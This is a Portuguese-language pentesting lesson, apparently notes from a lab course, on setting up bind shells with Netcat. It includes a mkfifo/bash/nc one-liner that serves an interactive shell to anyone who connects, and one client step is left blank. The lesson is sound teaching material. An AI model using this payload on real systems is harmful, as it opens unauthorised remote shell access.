Em muitos casos, trabalharemos para estabelecer um shell em um sistema em uma rede local ou remota. Isso significa que procuraremos usar o aplicativo emulador de terminal em nossa caixa de ataque local para controlar o sistema remoto através de seu shell. Isso geralmente é feito usando um `Bind` &/ou `Reverse` shell.

## O que é isso?

Com um bind shell, o sistema `alvo`  iniciou um ouvinte e aguarda uma conexão do sistema de um pentista ( caixa de ataque ).

![[Pasted image 20230703224945.png]]

Como visto na imagem, nos conectaríamos diretamente com o `IP address` e `port` ouvindo no alvo. Pode haver muitos desafios associados à obtenção de uma concha dessa maneira. Aqui estão alguns a considerar:

- Teria que haver um ouvinte já iniciado no alvo.
- Se não houver um ouvinte iniciado, precisaríamos encontrar uma maneira de fazer isso acontecer.
- Os administradores geralmente configuram regras rígidas de firewall de entrada e NAT ( com a implementação do PAT ) na borda da rede ( voltada para o público ), portanto, já precisamos estar na rede interna.
- Os firewalls do sistema operacional ( no Windows e Linux ) provavelmente bloquearão a maioria das conexões recebidas que não estão associadas a aplicativos confiáveis baseados em rede.

Os firewalls do sistema operacional podem ser problemáticos ao estabelecer um shell, pois precisamos considerar endereços IP, portas e a ferramenta em uso para fazer nossa conexão funcionar com sucesso. No exemplo acima, o aplicativo usado para iniciar o ouvinte é chamado [GNU Netcat](https://en.wikipedia.org/wiki/Netcat). `Netcat` (`nc`) é considerado nosso `Swiss-Army Knife` pois pode funcionar nos soquetes TCP, UDP e Unix. É capaz de usar IPv4 e IPv6, abrir e ouvir soquetes, operar como um proxy e até lidar com entrada e saída de texto. Usaríamos nc na caixa de ataque como nosso `client`, e o alvo seria o `server`.

Vamos entender mais profundamente isso praticando com o Netcat e estabelecendo uma conexão de shell de ligação com um host na mesma rede sem restrições.

## Praticando com o GNU Netcat

Primeiro, precisamos gerar nossa caixa de ataque ou Pwnbox e nos conectar ao ambiente de rede da Academia. Verifique se nosso alvo foi iniciado. Nesse cenário, estaremos interagindo com um sistema Ubuntu Linux para entender a natureza de um shell de ligação. Para fazer isso, usaremos `netcat` (`nc`) no cliente e servidor.

Depois de conectado à caixa de destino com ssh, inicie um ouvinte do Netcat:

#### No. 1: Servidor - Alvo iniciando o ouvinte Netcat

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

Nesse caso, o destino será nosso servidor e a caixa de ataque será nosso cliente. Depois de clicar em Enter, o ouvinte é iniciado e aguarda uma conexão do cliente.

De volta à caixa de ataque do cliente ( ), usaremos o nc para conectar-se ao ouvinte iniciado no servidor.

#### No. 2: Cliente - Caixa de ataque conectada ao destino

```shell-session
casluxd@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Observe como estamos usando o nc no cliente e no servidor. No lado do cliente, especificamos o endereço IP do servidor e a porta que configuramos para ouvir em (`7777`). Depois de nos conectarmos com sucesso, podemos ver um `succeeded!` mensagem no cliente, como mostrado acima, e uma `received!` mensagem no servidor, como visto abaixo.

#### No. 3: Servidor - Conexão de recebimento de destino do cliente

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Saiba que este não é um shell adequado. É apenas uma sessão do TCP da Netcat que estabelecemos. Podemos ver sua funcionalidade digitando uma mensagem simples no lado do cliente e visualizando-a recebida no lado do servidor.

#### No. 4: Cliente - Caixa de ataque enviando mensagem Hello Academy

```shell-session
casluxd@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Depois de digitar a mensagem e clicar em Enter, notamos que a mensagem é recebida no lado do servidor.

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

Nota: Quando estiver na rede da academia ( 10.129.x.x/16 ), podemos trabalhar com outro aluno da academia para conectar-se à sua caixa de destino e praticar os conceitos apresentados neste módulo.

## Estabelecendo shell básica com Netcat

Mostramos que podemos usar o Netcat para enviar texto entre o cliente e o servidor, mas esse não é um shell de ligação porque não podemos interagir com o sistema operacional e o sistema de arquivos. Só podemos passar texto dentro da configuração do pipe pelo Netcat. Vamos usar o Netcat para servir nossa concha para estabelecer uma concha de ligação real.

No lado do servidor, precisaremos especificar o `directory`, `shell`, `listener`, trabalhe com alguns `pipelines`, e `input` & `output` `redirection` para garantir que um shell no sistema seja atendido quando o cliente tentar se conectar.

#### No. 1: Servidor - Vinculando um shell de barra à sessão TCP

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Os comandos acima são considerados nossa carga útil e entregamos essa carga útil manualmente. Percederemos que os comandos e o código em nossas cargas úteis serão diferentes dependendo do sistema operacional host para o qual estamos entregando.

De volta ao cliente, use o Netcat para conectar-se ao servidor agora que um shell no servidor está sendo atendido.

#### No. 2: Cliente - Conectando para vincular o shell no destino

Percederemos que estabelecemos com sucesso uma sessão de bind shell com o alvo. Lembre-se de que tínhamos controle total sobre nossa caixa de ataque e o sistema de destino nesse cenário, o que não é típico. Trabalhamos com esses exercícios para entender o básico do shell de ligação e como ele funciona sem nenhum controle de segurança ( roteadores habilitados para NAT, firewalls de hardware, firewalls de aplicativos da Web, IDS, IPS, Firewalls do sistema operacional, proteção de endpoint, mecanismos de autenticação, etc ... ) no local ou são necessárias explorações. Esse entendimento fundamental será útil à medida que entrarmos em situações mais desafiadoras e cenários realistas que trabalham com sistemas vulneráveis.

Como mencionado anteriormente nesta seção, também é bom lembrar que a bind shell é muito mais fácil de defender. Como a conexão será recebida, é mais provável que seja detectada e bloqueada por firewalls, mesmo que portas padrão sejam usadas ao iniciar um ouvinte. Existem maneiras de contornar isso usando um shell reverso que discutiremos na próxima seção.